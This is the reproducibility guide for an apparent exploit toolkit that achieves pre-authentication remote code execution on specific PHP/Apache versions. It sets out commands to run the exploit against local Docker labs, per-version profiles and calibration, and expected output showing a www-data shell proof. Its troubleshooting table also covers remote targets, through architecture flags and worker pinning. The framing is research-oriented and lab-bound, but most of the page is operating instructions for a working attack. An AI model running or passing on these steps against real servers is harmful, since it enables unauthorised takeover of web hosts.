# Reproducibility

This page describes how to reproduce the verified results from a clean checkout.
Everything runs against local, isolated laboratories.

## Tested environment

| Component | Tested |
| --- | --- |
| Python | 3.11, 3.12, 3.15 |
| Docker | 29.x |
| Hosts | macOS arm64 (Apple Silicon), Ubuntu 24.04 amd64 (native) |
| Images | `php:8.4.25-apache`, `php:8.4.26-apache`, `php:8.5.10-apache`, `php:8.5.11-apache`, `php:8.3.35-apache`, `php:8.3.0-apache`, `php:8.5.0-apache`, `php:8.2.34-apache`, `php:8.1-apache`, `php:8.0-apache`, `php:7.4-apache` |

The 8.4.26 image is amd64-only. On an arm64 host it runs under emulation
(Rosetta), which is slower and does not support the native gdb recipes; the
offset and heap profiles are still the amd64 ones.

## 1. Bootstrap the upstream

```sh
python3 tools/bootstrap_upstream.py
```

The script clones the public 9bie research into `vendor/php2shell-upstream`
and pins commit `4586f5c`. The checkout is git-ignored. The toolkit applies the
SNI and heap-parameter changes in place at runtime; the same changes are
documented in [upstream-changes.md](upstream-changes.md).

## 2. Run the tests

```sh
python3 -m unittest discover -s tests -v
```

The suite covers version classification, profile selection, fetch/proof
resolution, command staging, inventory validity, README links and the banner
branding. It does not send network requests.

## 3. Start the laboratories

```sh
python3 tools/php2shell_labs.py up
python3 tools/php2shell_labs.py status
```

The labs bind to `127.0.0.1`:

| Port | Build |
| --- | --- |
| 8100 | PHP 7.4.33 |
| 8101 | PHP 8.0.30 |
| 8102 | PHP 8.1.34 |
| 8103 | PHP 8.2.34 |
| 8104 | PHP 8.3.35 |
| 8105 | PHP 8.4.26 |
| 8106 | PHP 8.5.11 |

Each lab uses `lab/rce/php.ini`, `lab/rce/apache.conf` (one worker) and a
per-lab `/out` mount.

## 4. Reference run (8.4.26)

```sh
python3 tools/php2shell_auto.py \
  -u http://127.0.0.1:8105/index.php \
  --container p2s-lab-8426 \
  --repo-dir vendor/php2shell-upstream
```

Expected:

```text
OK         PHP 8.4.26  ·  Apache/2.4.69 (Debian)
PREFLIGHT  php-8.4.26-bookworm-amd64
OK         detected memory_limit=8M
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
PRE-AUTH RCE CONFIRMED
```

Typical wall time is 7-15 seconds on a native host once the image is present.

## 5. Other verified builds

```sh
# 8.5.11 aarch64
python3 tools/php2shell_auto.py -u http://127.0.0.1:8106/index.php --container p2s-lab-8511 --memory-limit-mb 8

# 8.5.11 amd64 (separate offsets; --arch is auto-detected for local containers)
python3 tools/php2shell_auto.py -u http://127.0.0.1:<port>/index.php \
  --arch amd64 --container <amd64-lab> --memory-limit-mb 8

# 8.4.25 is probabilistic: keep the default retries
python3 tools/php2shell_auto.py -u http://127.0.0.1:<port>/index.php \
  --profile 8.4.25-bookworm-aarch64 --memory-limit-mb 8
```

A version with several builds (8.5.11 aarch64/amd64) needs `--profile`; the
offsets differ even though `htdata` is the same.

## 6. Calibration workflow

```sh
python3 tools/php2shell_calibrate.py \
  --target http://127.0.0.1:8105/index.php \
  --container p2s-lab-8426 \
  --repo-dir vendor/php2shell-upstream \
  --proof-file lab/rce/out/8.4.26/p1 \
  --distro bookworm
```

Stages 1 and 2 are discovered automatically. Stage 3 is attempted with the
known layouts and `rce: true` is written only after a real command proof. A
profile that only leaks is stored with `rce: false`.

## 7. Architecture notes

- **8.4.26**: amd64 image; on arm64 it runs under emulation. The profile is
  `php-8.4.26-bookworm-amd64`.
- **8.5.11**: aarch64 and amd64 have different offsets; use the matching profile.
- **8.4.25**: stage 3 is probabilistic; run with the default retries.
- **8.3.35 / 8.3.33**: stage 1-2 work; stage 3 is blocked by a live session
  reference, not a calibration error.
- **7.4 / 8.0 / 8.1 / 8.2**: the stale id exists, but the stage-1 cookie does
  not reclaim it.

## 8. Troubleshooting

| Symptom | Check |
| --- | --- |
| `cannot determine the PHP version` | `--php-version X.Y.Z` or `--profile NAME` |
| `TLSV1_ALERT_INTERNAL_ERROR` | HTTPS sends SNI; the chain's HTTPS transport is still experimental |
| HTTPS stage 1 fails | use HTTP for the verified path; HTTPS is not end-to-end verified |
| `no proof yet` | `/out` mount, writable webroot, served output path |
| proof missing on a local lab | container user cannot write `/out`; use `chmod 777 <out-dir>` |
| stage 1 fails on a multi-worker target | `--pin-workers N` (remote pinning is opt-in) |
| `ARCH REQUIRED` on a remote target | pass `--arch aarch64|amd64` or `--profile NAME`; HTTP cannot reveal the CPU |
| probe inconclusive | `--memory-limit-mb N` or `--no-probe` |
| stage 3 fails | verify the exact build/profile; 8.4.25 needs retries |

## 9. Secret scan

```sh
gitleaks detect --source . --no-git --redact -v
```

The repository should be clean. Do not add real target data, cookies,
credentials or logs from systems you do not own.

## 10. Known gaps

- `display_errors=Off` and `expose_php=Off` are open calibration items.
- PHP-FPM is not supported by the shipped chain.
- 8.5.0 has leaks but no verified stage 3.
- Remote proof collection depends on a writable, web-served output path.

See [branch-notes.md](branch-notes.md) for the measurements behind these
statements.
